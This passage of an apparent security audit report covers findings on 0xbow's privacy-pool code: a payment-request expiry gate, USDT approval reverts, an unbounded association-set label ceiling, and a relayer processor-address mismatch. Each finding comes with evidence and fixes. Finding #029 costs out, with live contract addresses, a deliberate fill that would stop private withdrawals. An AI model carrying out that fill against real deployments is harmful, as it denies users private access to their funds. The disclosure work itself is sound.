Whether the payment can be recovered afterwards depends on the local record surviving, and that dependence is not created by this defect: a blind payment-request note's `noteSecret` is fresh randomness from `generateSecret`, held only in the recipient's local slot map, and `hydrate` re-derives the payment private key alone, from the viewing key, the owner address and the `paymentId`, which is itself fresh randomness, so restoring from the seed phrase recovers neither. The gate's own reach is narrow: this is the only place in the SDK where a wall-clock comparison gates the processing of historical data, and it has one consumer.

A proof of concept that exercises the real cryptography, note computation, payment-request and discovery services, with only the clock faked, passes in all three of its cases against the code at this commit: the payment is discovered when the recipient scans a day later; the same on-chain note is not discovered when their first scan is eight days and one second later, and a subsequent rescan from the first block still finds nothing; and the very same event decrypts correctly, with the slot secret matching, the moment the record is handed to the scanner directly.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/PaymentRequestService.ts#L174-L179
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/PaymentRequestService.ts#L287-L306
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L138-L154
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L290-L298
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionTransfer.ts#L266-L291
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/constant/PaymentRequest.ts#L8-L28
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteComputationService.ts#L306-L316
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/schemas/PaymentRequest.ts#L39-L49
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/interfaces/IPaymentRequestService.ts#L27-L105
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/types/PoolSessionNoteDiscovery.ts#L97-L118
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionExport.ts#L60-L76

#### Impact

The funds are invisible rather than lost. The spending secret is never pruned, since the service has no prune path and the record keeps its `noteSecretsMap`; the expiry stamp is optional in the record schema; and the whole record round-trips through public SDK surface. A recovery therefore exists and runs end to end: `PoolSessionExport.exportAccount` emits the payment requests with their secret maps, the `expiresAt` stamp can be removed from the affected record, and `importAccount` restores it without re-stamping, since `hydrate` sets only the consumed slots and the re-derived payment key. A stampless record then takes `isExpired`'s unconditional `false` branch, so a rescan from an explicit `fromBlock` discovers the payment and it is spendable.

What is missing is any way for a user to arrive at that. No interface offers it, no error mentions it, no log names the request that was skipped, and no documentation describes the procedure. A first-class affordance for returning a lapsed request to the scan set would close the gap, and the SDK ships none: `IPaymentRequestService` exposes `generate`, `list`, `getOpenRequests`, `getScannableRequests`, `markFulfilled`, `archive`, `clear`, `loadFromStorage`, `exportState` and `importState`, and `DiscoverNotesParams` carries `fromBlock`, `contacts` and `stealthDepositCredentials`; none of the thirteen un-expires a request or overrides the request set. From the wallet's point of view nothing happened: no note, no warning, and no difference between a payment that was never made and one that was made and filtered out.

#### Recommendation

We recommend gating scan eligibility on when the payment landed rather than on when the recipient happens to open their wallet, since a payment is either inside its window or outside it and that is a property of when it was made. The gate is one predicate, evaluated in one place, with one consumer, and the events are already in hand before the request set is asked for; what the predicate lacks is a time for the event, since a note event carries its block number while the stamp is a millisecond timestamp. Either resolution closes that: look the scanned block's timestamp up once per scan, or stamp a block bound onto the request beside `expiresAt` at generation and compare block numbers. The wall-clock comparison can stay for archival and user-interface purposes, where "this request has lapsed" is the right thing to say, but holding requests in the scan set until their block range has been covered is not a substitute, because it reopens the unbounded growth of the scan set that the expiry filter exists to bound. We also recommend a regression test that couples the filter to discovery: the service's own unit tests exercise the boundary thoroughly, at `expiresAt` plus grace exactly, one millisecond past it, and the stampless case, but every test of the discovery path stubs `getScannableRequests` to return an empty list, so nothing covers a payment whose block falls inside the window while the recipient's first scan falls outside it.

Until the gate is corrected, we also recommend documenting the recovery (export the account, clear the stamp on the affected request, import, and rescan from the payment's block) and surfacing something at scan time when a request is excluded while unscanned blocks remain inside its range, so that a user who cannot see a payment can at least learn that one was filtered.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #028 — No shipped TypeScript path ever issues `approve(spender, 0)`, so mainnet USDT reverts on a residual allowance

**Severity:** Low · **Location:** `packages/swaps/contracts/src/RelaySwaps.sol` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** CONFIG · **Status:** Open

#### Description

Moving a user's ERC-20 tokens takes two transactions. First the holder approves a spender for an amount, then the spender pulls up to that amount. The SDK builds the approval for every deposit path and hands it to the user to sign before the deposit; the relayer's dust-rescue service builds and signs its own before depositing swept tokens as a note.

When the second transaction fails, the approval from the first is still standing, and on mainnet USDT a standing allowance is not something the next attempt can simply overwrite: the token rejects any approval that moves an allowance from one non-zero value to another. The wallet is then stuck on that token and that spender until the allowance is written back to zero, and nothing does that by itself, because an allowance is state on the token that outlives the failed deposit, the process that made it, and any retry. The remedy is a two-step convention, write zero and then write the intended amount, and this project's Solidity follows it: `RelaySwaps` resets the allowance to zero after every use, and `Entrypoint` approves through a helper that writes zero and retries when an approval fails, a helper whose own documentation names USDT as the reason it exists.

**Where it breaks.** The convention holds on one side of the codebase and is absent from the other:

- in Solidity, both contracts in the audited set that approve anything make a non-zero-to-non-zero approve impossible, by two different mechanisms;
- in TypeScript, five shipped sites emit an approve and not one is preceded by a zeroing write, and no shipped path issues `approve(spender, 0)` at all.

The allowance pre-check the builders run is not the missing guard, because it skips the approval only when the standing allowance is already big enough, and the case it deliberately lets through, a non-zero allowance that is too small, is exactly the case the token rejects. On the rescue path the standing allowance is certain rather than unlucky: the rescue wallet holds only the swept amount while the deposit pulls the swept amount plus the deposit's vetting fee, so the deposit cannot succeed and the approval it needed is left behind.

From that point the wallet cannot approve that spender again: the deposit or the rescue the approval existed for cannot proceed, a rescue job exhausts its attempts and is marked failed, and only a bare `approve(spender, 0)` signed from the affected wallet clears it.

Mainnet Tether refuses to change a non-zero allowance directly. Its `approve` carries `require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)))`, so an approval for a non-zero amount reverts whenever the current allowance is already non-zero. The canonical handling is to write zero first, then set the intended value. Read-only calls against `0xdAC17F958D2ee523a2206206994597C13D831ec7`, with no transaction sent, give the full truth table, every amount in base units: from an allowance of zero, `approve(spender, 500)` succeeds; from an allowance of 1000, the same call reverts; `approve(spender, 0)` succeeds. The triple was reproduced independently against a real owner already holding a non-zero allowance, where `approve(spender, 5)` reverted, `approve(spender, 0)` succeeded, and `eth_estimateGas` for `approve(spender, 5)` returned `execution reverted`. A single successful non-zero-to-non-zero `approve` would have falsified the restriction, and there is none.

The project applies that discipline in its contracts and nowhere in its shipped TypeScript.

The two contracts in the audited set that approve anything, `RelaySwaps` and `Entrypoint`, both make a non-zero-to-non-zero `approve` impossible, by two different mechanisms. `RelaySwaps`' gas-swap block calls `safeApprove(approvalAddress, gasSwapMaxInput)`, executes the swap, then calls `safeApprove(approvalAddress, 0)`; its ERC-20 swap block does the same around `swapCalldata`. The allowance is back at zero before the contract ever approves again. `Entrypoint.setAssetConfiguration` takes the other route: it calls `safeApproveWithRetry` on the asset, a helper from Solady's `SafeTransferLib` rather than OpenZeppelin's `SafeERC20`, which neither contract imports, and which on a failed `approve` writes `approve(0)` and retries, and whose own NatSpec names USDT as the reason it exists. One contract resets after every use, the other forces the write through.

In TypeScript, nothing does. Five shipped approval sites emit an `approve`, and not one of them is preceded by a zeroing write:

- `EntrypointInteractor.encodeApprove`, which encodes `approve(entrypoint, amount)` and is fed by `PoolSessionDeposit.buildApprovalTx`;
- `PoolSessionSwapDeposit.buildInputTokenApprovalTx`, which approves the input token to the LiFi router;
- the prepared `approvalTx` in `PoolSessionYieldDeposit.prepareYieldDeposit`, which approves the underlying to `ppRouter` for `maxUnderlyingIn` and does not read the current allowance at all;
- `DustRescueForwardingService.maybeApprove` in the relayer;
- the `PreparedApprovalTx` that `ChainWriteService.approve` broadcasts for the dust-rescue service.

A repository-wide search for a zero-valued approve across the workspace returns exactly one hit outside tests, and it is not on a shipped path: the `DUST_MATRIX_REVOKE_APPROVALS` branch of the dust-rescue-cost-matrix benchmarking script. An `approve(spender, 0)` issued ahead of the non-zero approval at any of the five shipped sites would have falsified that search, and there is none. The script's comment states the point this finding is about, in the project's own words: its `ensureApproval` helper "no-ops once allowance already satisfies `neededAmount`, and `0n` always trivially satisfies that check — revoking needs an explicit `approve(spender, 0)` whenever the current allowance is nonzero, which is the opposite condition." The same `ensureApproval` helper, declared earlier in that file and used by the script's own measurement loop, approves `neededAmount` without zeroing. The pattern was understood and written down in TypeScript, and applied only where no user and no service would run it.

The allowance pre-check is not the missing guard. `buildApprovalTx` reads `getAllowance(tokenId, ownerAddress, entrypoint)` and returns `null` when the result already covers `value + fee`, which reads like protection. It is not, for two independent reasons. The check short-circuits only when the standing allowance is sufficient, and the case it deliberately lets through, a non-zero allowance that is too small, is precisely the case the token rejects. Separately, on the rescue path the check reads a value that is never the signer's: `proveDustRescueDeposit` builds its `PoolSession` with `ownerAddress: "0x0000000000000000000000000000000000000001"`, a placeholder its own surrounding comments identify as one, so `getAllowance` is asked about an address that holds no allowance, always reads zero, and `buildApprovalTx` emits an approve on every rescue job for every ERC-20 regardless of what the rescue signer actually has standing.

The residual that triggers it is certain on a fee-bearing asset, not incidental. `Entrypoint.deposit` computes `_amountPlusFees = _value + _fee` and pulls that with `safeTransferFrom`. A successful deposit consumes the approval exactly and leaves nothing behind, which is why this is invisible on the happy path. But the rescue wallet holds only the swept amount, which is `_value`, while the pull is for `_value + _fee`; at `vettingFeeBPS` of 100, the value every USDT row in `ChainAssetRegistry` carries, the transfer asks for 1.01 times the balance and reverts. The approval has already landed in its own earlier transaction, so the failure strands it. For any asset configured with a non-zero vetting fee, the first rescue leaves a residual by construction.

The relayer and the dust-rescue service both pin viem 2.22.14 through the workspace's shared catalog. `sendTransaction` routes through `prepareTransactionRequest`, which calls `estimateGas` whenever no `gas` field is supplied, and neither `ChainWriteService.send` nor `EVMChainService.sendRawTransaction` supplies one. The revert therefore surfaces before broadcast: `ChainWriteService.send` catches it and rethrows as `approval tx failed: …`, `SweepService.handleSubmitting` propagates it, `SweepService.recordFailure` increments `attempts`, and the job is marked `FAILED` once `attempts` reaches `sweepMaxAttempts`, which is 5 in the shipped example configuration. Nothing anywhere sets the allowance back to zero, so every later job against that token on that wallet takes the same route.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L349-L358
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L120-L127
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L57-L86
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/contractInteractors/EntrypointInteractor.ts#L214-L225
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionDeposit.ts#L452-L477
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-prover/src/proveDustRescueDeposit.ts#L121-L130
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/registries/ChainAssetRegistry.sol#L60-L79

#### Impact

Three shipped paths carry the defect, and they are not equally exposed.

The SDK's approval builders are the leg that reaches mainnet USDT and user wallets. `PoolSessionDeposit.buildApprovalTx` and `PoolSessionSwapDeposit.buildInputTokenApprovalTx` run with a real `ownerAddress` and target the `Entrypoint` or the LiFi router on the session's chain. `ChainAssetRegistry`'s mainnet block enables Tether at `0xdAC17F958D2ee523a2206206994597C13D831ec7` with `enabled: true, minAmount: 1, vettingFeeBPS: 100`, and the audited mainnet `Entrypoint` `0x02a1E00294291d0E938eC92A8c2883044524ec4B` returns exactly that struct when read on chain. A user whose USDT deposit failed after their approval landed carries a residual; their next deposit builds a non-zero-to-non-zero approve and reverts with nothing to explain it, and `PoolSessionDeposit.assertApprovalTx`, which validates the approval's target, selector and spender before signing, has nothing to say about it. These are transactions a user signs in their own wallet.

The relayer's forwarding approval is live on mainnet and benign. `DustRescueForwardingService.maybeApprove` runs on the source chain, so mainnet Tether reaches it, but the class contract on `forward` is explicit that the path is "strictly additive: any failure at any step is logged and swallowed" and never throws into the caller's request path. A reverting approve there costs a courtesy forward.

The dust-rescue service is where the mechanism is most complete and least reachable. Every element is in place: the placeholder owner makes the approval unconditional, the fee-short deposit makes the residual certain, and `recordFailure` terminates the job. What is not established is mainnet as a destination. The shipped example configuration names exactly two destination chains, Arbitrum (42161) and Base (8453), and the service README frames coverage as "Arbitrum/Base … if a third destination chain is ever added". Mainnet is not excluded by any code path, and the production configuration is not in the repository, so nothing in the tree settles it. The USDT rows for those two chains are separate bridged deployments at different addresses, and this finding makes no claim about their approve semantics. On the second mainnet stack the path does not begin at all: the prod:v1 `Entrypoint` `0xca1e072236D231130059eeA6Bfceb7F4e9a1F0C3` returns USDT disabled, and `Entrypoint.deposit` requires `_config.enabled` before any transfer.

No wallet is wedged today. Read-only against mainnet, the rescue signer's USDT allowance reads zero to both the audited registry `Entrypoint` and the prod:v1 `Entrypoint`; a non-zero standing allowance on either would have shown the condition already present, and there is none. That bound is on timing rather than likelihood: for an asset configured at 100 basis points the deposit that follows the approval cannot succeed, so the residual arrives with the first USDT rescue attempted rather than with some unlucky one.

Where it is reached, the consequence is a transaction that reverts, gas spent on each attempt, and on the rescue path a job that terminates `FAILED` once its configured attempts are exhausted, until someone signs a bare `approve(spender, 0)` from the affected wallet. No funds are stolen and no allowance is corrupted. On the rescue leg the wallet carrying the residual is the wallet whose key clears it, in one transaction, though what goes unrescued while it is stuck is a note that would have been minted to a stealth address derived for the relay caller, so the operator is not the only party affected. On the SDK leg the affected user can clear their own residual from any wallet interface.

#### Recommendation

We recommend zeroing before setting on every path that issues an approve to a token the protocol does not control: send `approve(spender, 0)` and wait for inclusion whenever the current allowance is non-zero and differs from the target, then send the intended amount. The zeroing decision is `allowance != 0 && allowance != target`, which is a different condition from the `allowance >= needed` test the builders run today, so it cannot be expressed as a stronger version of the existing pre-check. Apply it to the SDK's approval builders first, because `PoolSessionDeposit.buildApprovalTx`, `PoolSessionSwapDeposit.buildInputTokenApprovalTx` and `PoolSessionYieldDeposit.prepareYieldDeposit` emit transactions users sign, and `PoolSessionYieldDeposit` does not read the current allowance at all before approving `maxUnderlyingIn`, so it needs the read as well as the zeroing step. Approving exactly what will be spent and revoking the remainder once the spend completes removes the residual entirely, and it matches what `RelaySwaps` already does in Solidity. Fix the rescue path's allowance read in the same change: `proveDustRescueDeposit` passes a placeholder `ownerAddress`, so `buildApprovalTx` cannot see the rescue signer's real standing allowance, and either the signer address the service will actually broadcast from should be passed instead, or `ChainWriteService` should check and clear the allowance itself before submitting the prepared approval.

We also recommend a regression test that runs an approval sequence against a token mock carrying the non-zero-to-non-zero restriction, covering all five sites, so the discipline the Solidity already follows is enforced in the TypeScript. The restriction is four lines to reproduce, and a mock is sufficient.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #029 — No contract counts or bounds association-set labels against the 262,144 ceiling the transact circuits impose

**Severity:** Low · **Location:** `packages/contracts/src/contracts/ASPRegistry.sol` · **Bug:** Medium · **Payout:** Medium · **Novelty:** NEW · **Reach:** PERM · **Root cause:** RC-05 (2 findings) · **Status:** Open

#### Description

Anyone can deposit into this pool; withdrawing privately takes one more step. Every deposit mints a label, a permanent identifier for the funds it creates, and a compliance provider decides off chain which labels it will vouch for. The provider gathers the labels it has approved into one Merkle tree, the association set, and publishes only that tree's root on chain. A private withdrawal proves inside the circuit that its note's label sits in the tree behind the published root, and the pool accepts the proof only if it names that exact root.

The association set has a ceiling nobody can move at short notice. Every compiled transact circuit is built for a set of at most depth 18, so the largest tree whose root a proof can reproduce holds 2 to the 18th labels, which is 262,144. The set only ever grows toward it: one label per deposit, and no label can be pruned, because it must stay published for as long as any unspent note descends from it. Raising the ceiling means recompiling every transact circuit, a fresh per-circuit Groth16 setup, and a new verifier deployed and routed for each proof shape on every chain, which is not something an operator does on the day the set fills.

**Where it breaks.** The ceiling lives in the circuits, and the contracts that take deposits and publish roots do not know it exists:

- the state tree and the keystore tree each have an on-chain size cap, and every insertion into them is required to fit under it;
- the association set has no counterpart: no contract counts labels, caps them, refuses a deposit that would carry the set past the ceiling, or exposes an occupancy figure to compare against it.

So deposits keep succeeding straight through the boundary. The 262,144th label is the last provable one, and the deposit after it still takes the funds, inserts the commitment and emits its events; nothing reverts, and nothing on chain records that the line was crossed. Funds are not stranded whichever way it goes, because the public ragequit exit reads no association-set root, but that exit pays the owner address in the clear and publishes the label.

The whole of the cost then falls on the set operator's next publication: publish the over-sized set and no note in the pool can be withdrawn privately at all, because every proof is pinned to the latest published root by exact equality and no compiled circuit can reproduce a root over that many labels, or leave the new label out and that depositor, and every later one, is left with the public exit as their only way out.

Three trees govern capacity in this protocol, and only two of them are checked on chain.

The state tree is compiled at depth 22, admitting 4,194,304 leaves, and every mutating vault entry point (`PoolVault.deposit`, `PoolVault.transact` and `PoolVault.ragequit`) requires that the insertion fit under `maxStateTreeSize`. The keystore tree is compiled at depth 18, admitting 262,144 leaves, and `Keystore._setAuthPolicy` requires the same against `maxKeystoreTreeSize`. The association set is also compiled at depth 18, admitting 262,144 labels, and no contract counts them, caps them, or relates them to anything else; the bound lives in the circuit parameters and in one SDK constant, `ASSOCIATION_SET_MAX_DEPTH`.

`ASPRegistry.updateASPRoot` is gated on `POSTMAN_ROLE` and validates only the root's non-zeroness, its membership in the SNARK scalar field, and a non-empty IPFS CID, then pushes. There is no leaf count, no depth and no size in the call, in the stored `AssociationSetData`, or in the `ASPRootUpdated` event. `ASPRegistry.registerLabel` is permissionless and only emits `LabelRegistered`. `IASPRegistry` publishes no length or count getter of any kind: not of labels, and not of publications either, since `associationSets` is indexed and the array length is reachable only by reading storage. A leaf count carried on `updateASPRoot`, a deposit counter compared against a label maximum, or any contract constant naming the association-set depth would each put the bound on chain, and the contracts package holds none of them: it declares no tree-depth constant at all.

The bound is enforced in exactly one place, and that place is off chain: `ASPClient.getAssociationSetLeaves` rejects a provider response holding more than `2 ** ASSOCIATION_SET_MAX_DEPTH` leaves and falls through to the next provider. An over-depth published set is over-depth for every honest provider, so that fall-through ends in `ASPUnavailable` rather than restoring service.

Labels are one-to-one with deposits and grow monotonically. The deposit circuit computes label as a Poseidon hash of the precommitment and `depositSecret`, a private per-deposit input, so every deposit mints a distinct one. The transact circuit only consumes labels: it proves each input's label hash into the published root through `BinaryMerkleRoot(associationSetMaxDepth)` after asserting `associationSetTreeDepth[i] <= associationSetMaxDepth`. The assertion is depth-bounded rather than fixed-depth, so a shallower set still proves, but the bound is hard, and all twenty-five compiled `Transact` configurations in `circuits.json` instantiate the template at `(22, 18, 18)`; one entry with a larger `associationSetMaxDepth` would raise the ceiling, and there is none. A depth-19 set fails the assertion everywhere. Nor can the set be pruned: a label must stay published for as long as any unspent note descends from it, and which lineages are exhausted is exactly the information the pool exists to hide.

So the set grows with cumulative approved deposits toward a hard ceiling that nothing enforces, while the enforced state capacity is sixteen times larger in leaves. Measured in deposits the gap is narrower, because the state tree's 4,194,304 leaves are shared between commitment and timestamped nullifier leaves, as the project's own capacity note records, so one deposit-then-withdraw lifecycle consumes several state leaves against one label. The unenforced ceiling binds first.

Which labels reach the set is decided off chain, and that is the precondition for ever arriving at the ceiling. Anyone can deposit, each deposit mints a distinct label, and `registerLabel` submits it for screening in the same transaction, but only `POSTMAN_ROLE` can publish a root and the association-set provider chooses what enters it. The only provider shipped here is a sample listener whose own header says a real ASP would evaluate compliance rules before admitting a label, and the design documentation places the ASP outside the system boundary. Holding the set below its ceiling against a deliberate fill needs a per-party or per-period volume control, and nothing in this repository implements, specifies or documents one.

At the boundary the behaviour is a stop, not a degradation. The 262,144th label is the last provable one, and the next deposit still succeeds in full: the entry point takes the funds, the vault inserts the commitment, `Deposited` fires, the label goes out for screening on `LabelRegistered`, and nothing reverts. The tree the contracts do guard holds at least 262,145 of its 4,194,304 leaves at that moment, 6.25 %. The set operator is left with three branches:

- Include the new label. The set has 262,145 leaves and a depth of 19, no compiled transact circuit can reproduce that root, and because `PoolVault._validateAndVerify` pins every proof to `latestASPRoot()` by exact equality, every input note in the pool becomes unprovable, not only the new one. One root publication stops private withdrawals system-wide.
- Omit it. That depositor's note has no private exit, permanently, and neither does any later depositor's while the set stays full. Their only path out is the public `ragequit`, which pays the owner address in the clear and publishes the label.
- Evict older labels to make room, which pushes whoever was evicted onto the same public path, retroactively.

Two mechanics bound the damage, and neither is written down anywhere in the repository. `ragequit` reads no association-set root: it checks the caller against the proof's owner address, the commitment's existence, the nullifier's freshness, the keystore root and its own Groth16 proof, and never touches `aspRegistry`, so funds survive the cliff. And an over-depth published set is repaired by republishing a truncated one: `updateASPRoot` only appends, `latestASPRoot` reads the last element, and there is no monotonicity or anti-rollback check, so one postman transaction restores withdrawals for everyone inside the ceiling.

Nothing on chain signals that the boundary was crossed or is being approached: the published roots are an append-only array with no size metadata, and no contract exposes an occupancy figure to compare against the 262,144 that only the circuits know. The project's capacity documentation prints all three ceilings in one table (4.2M state leaves, 262K keystore users, 262K ASP labels) without recording that two of the three are enforced by a contract and the third by nothing.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/ASPRegistry.sol#L52-L64
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/interfaces/IASPRegistry.sol#L60-L88
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L352-L356
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L124-L125
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L202-L212
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits/templates/Transact.circom#L165-L171
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits/templates/Transact.circom#L217-L224
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits.json#L12-L21
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/constant/WitnessPreparationService.ts#L30-L33

#### Impact

Every live deployment has this shape: read over public RPC on 2026-09-14, all eight instances (two on Ethereum, two on BNB Chain, two on Arbitrum, one on Optimism and one on Base) return `maxStateTreeSize() == 4,194,304` and `maxKeystoreTreeSize() == 262,144`, and none exposes a label equivalent, because no such view exists on any contract.

The ceiling is far away today. The busiest instance, the Arbitrum registry at `0xbEb83978090d4c54E9e93a7cDCEd7a41B134927D` serving the pool at `0x38B829a19B178fA5Defa1D379C2859bd3e5B3451`, carries 163 `LabelRegistered` events across its full history, 0.06 % of 262,144. Where logs are unavailable from a public endpoint, a pool's state-tree leaf count over-counts its deposits and so bounds its labels: no live state tree holds more than 382 leaves, the next is 149, and both Ethereum pools are under 100. At least 261,762 further admitted deposits stand between any live stack and the cliff.

Closing that distance is not capital-bound. `minAmount` is 1 wei for the native asset on most live entry points, including the Ethereum `Entrypoint` at `0x02a1E00294291d0E938eC92A8c2883044524ec4B` and the Arbitrum one at `0xad0b4d5212C126B334Af11Bf4547eF4C91Bfcf44`, and the principal round-trips: `ragequit` returns the full value and inserts a nullifier leaf while releasing nothing in the association set, since no code path in `ASPRegistry` or `PoolVault` removes a label. One `minAmount` covers each deposit in flight, not each label. What remains is gas: the last eight label-registering deposits through that Arbitrum `Entrypoint` used 590,081 to 807,255 gas, median about 617,000, putting a deliberate fill of all 262,144 slots near 1.6 × 10¹¹ gas, and more if the filler also ragequits to recycle principal. At the 0.0201, 0.0060 and 0.50 gwei those chains quoted on 2026-09-14, that is about 3.2 ETH on Arbitrum, 1.0 ETH on Base and 81 ETH on Ethereum.

#### Recommendation

We recommend putting the association-set bound on chain in `ASPRegistry`: extend `updateASPRoot` to carry the leaf count of the tree it commits to alongside the root and the CID, reject any update whose declared count exceeds 262,144, store it in `AssociationSetData` and emit it in `ASPRootUpdated`; add a monotonic counter, incremented either in `registerLabel` or over deposits at the entry point, and expose it through `IASPRegistry`, which today publishes neither a label count nor the number of published sets; and declare the association-set depth as a named constant beside the state and keystore caps, gating deposits on it so a deposit that cannot be given a provable label is refused rather than accepted and kept. A counter and a bound are one storage variable and one require today, whereas raising the depth later means recompiling all twenty-five transact shapes, a fresh Groth16 per-circuit setup and a new verifier contract for each, a `TransactVerifierRouter.setVerifier` call per N×M shape on every chain, and every user re-proving mid-flight. We also recommend recording in the capacity table which of its three ceilings a contract enforces and which none does, stated in deposits rather than leaves because state-tree leaves are shared between commitments and nullifiers; recording as a runbook entry that an over-depth published set is repaired by republishing a truncated root in one `updateASPRoot` call, since it only appends and `latestASPRoot` reads the tail; and asking the association-set provider whether admission applies any per-party or per-period limit or only compliance screening.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #030 — `RelayerInfo` carries one `processorAddress`, but the relayer calls the vault from three different addresses

**Severity:** Low · **Location:** `packages/contracts/src/contracts/PoolVault.sol` · **Bug:** Medium · **Payout:** Medium · **Novelty:** NEW · **Reach:** CONFIG · **Status:** Open

#### Description

A relayer lets a user spend a note without holding gas or appearing on chain as the sender. The user builds a proof, hands it to the relayer, and the relayer makes the call and keeps a fee. The vault accepts that call from one address and no other: the transaction parameters name a processor, the vault requires that processor to be the caller, and it requires the proof to have committed to those same parameters, so the address the relayer will call from has to be fixed before the user starts proving.

If the address committed in the proof is not the one the relayer calls from, the vault rejects the transaction, and it rejects it after the user has paid the full cost of proving. Retrying does not help, because the address is not negotiated per call: it comes from a single static field of the relayer's published description, so the same rejection lands for that user and for every other user on every attempt until an operator edits the configuration. The way an integrator is meant to obtain that address in the first place is the relayer's own details endpoint, which publishes the deployment's contract addresses.

**Where it breaks.** One field is made to describe three different callers:

- the SDK's `RelayerInfo` declares a single `processorAddress`, and all three session paths commit that one value into the proof;
- the relayer calls from its own signer account on a relayed private transfer, from the `PrivacyPoolRelay` contract on a relayed withdrawal, and from the `RelaySwaps` contract on a withdraw-and-swap or a reshield.

Whichever of the three the field is set to, the other two commit a processor that the relayer will never be. The details endpoint publishes the two contract addresses but never the signer account, so the value the transfer path needs cannot be obtained from it at all.

At most one of the three flows can work on a deployment at a time, so an operator who configures for withdrawals has silently disabled relayed transfers for every user, indefinitely, and the reverts that result name the proof rather than the configuration that caused them.

`PoolVault.transact` binds the processor twice. It requires that the processor named in the transaction parameters equal `msg.sender`, and it requires that the proof's context equal the keccak hash of those same transaction parameters and the note data, reduced modulo the SNARK scalar field. Both requirements sit above `_validateAndVerify` and above every commitment and nullifier write, so the prover must know at proving time exactly which address will make the call.

The relayer calls from a different address on each of its three flows, and on each of them it takes that address from its own configuration or its own signer rather than from the `RelayerInfo` the session holds:

| Flow | Contract the relayer calls | Processor the relayer sets |
| --- | --- | --- |
| Relayed private transfer, `simulateAndWriteRelayTransfer` | `poolVaultContractAddress()`, the vault directly, with `PrivacyPoolRelay` not involved | `walletClient.account.address`, the relayer's own signer account |
| Relayed withdrawal, `simulateAndWriteRelay` and the `RegisterAndRelay`, `RelayAndAnnounce` and `RelayBatch` variants | `relayContractAddress()` | `relayContractAddress()`, the `PrivacyPoolRelay` contract |
| Withdraw-and-swap and reshield, `simulateAndWriteRelaySwap` | `relaySwapsContractAddress()` | `relaySwapsContractAddress()`, the `RelaySwaps` contract |

The SDK has one field for all three. `RelayerInfo` declares a single `processorAddress`, and the three session paths commit that one value into the proof context: `PoolSessionTransfer.relayTransfer`, `PoolSessionWithdraw.relayWithdraw` and `PoolSessionReshield.relayReshield` each build `transactParams` as `{ processor: selectedQuote.relayerInfo.processorAddress, data: … }`, which `TransactOrchestrator.computeTransactContext` ABI-encodes and hashes. `PoolSessionReshieldCrosschain` and `PoolSessionBatchWithdraw` read the same field. A per-flow override of the kind `runPrepareTransact` accepts on the self-submit path would break that dependence, and `relayTransfer` applies none: it passes `relayerInfo.processorAddress` through unchanged into both `transactParams` and `runPrepareTransact`.

